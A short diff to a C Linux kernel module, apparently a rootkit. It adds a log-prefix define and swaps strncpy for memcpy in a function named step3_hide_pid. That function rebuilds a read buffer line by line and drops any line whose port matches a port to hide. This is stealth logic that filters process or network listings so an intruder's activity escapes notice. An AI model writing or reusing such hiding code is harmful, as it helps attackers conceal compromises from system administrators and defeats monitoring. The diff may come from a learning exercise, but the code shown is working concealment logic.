@@ -1,3 +1,5 @@
+#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+
 #include "step3.h"
 #include "helpers.h"
 #include <linux/string.h>
@@ -35,7 +37,7 @@ step3_hide_pid(char *read_block_id, char *read_path, char *read_buffer, size_t r
                 // writes line sequentially except line to hide,
                 // so when line needs to be hidden it will be overriden or ignore with the new length
                 if (port != port_to_hide) {
-                    strncpy(read_buffer + new_length, row_start, row_length);
+                    memcpy(read_buffer + new_length, row_start, row_length);
                     new_length += row_length;
                 }
             } else {
